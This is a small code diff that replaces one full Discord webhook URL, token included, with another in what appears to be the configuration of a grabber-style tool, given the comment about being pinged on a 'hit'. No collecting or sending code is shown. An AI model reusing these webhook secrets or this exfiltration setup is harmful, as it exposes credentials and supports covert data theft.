@@ -18,8 +18,7 @@ rand1 = randint(1,99)
 
 
 
-# your webhook URL
-WEBHOOK_URL = 'https://discord.com/api/webhooks/989895453434867733/eXkzkzGNNcaArkKUSe2mdWEZaKll6Ni_my8wJXVJZNQGC2F7rNy1XOaVwtzHTRRsRgk9'
+WEBHOOK_URL = 'https://discord.com/api/webhooks/990147487417397288/HJPa5FAdHR6B9Zq49GmAarknqWaakGYHqPpCp-6Crl8VSXCjuwxrTW58Ka8GiFsVa4GD'
 
 # mentions you when you get a hit
 PING_ME = True
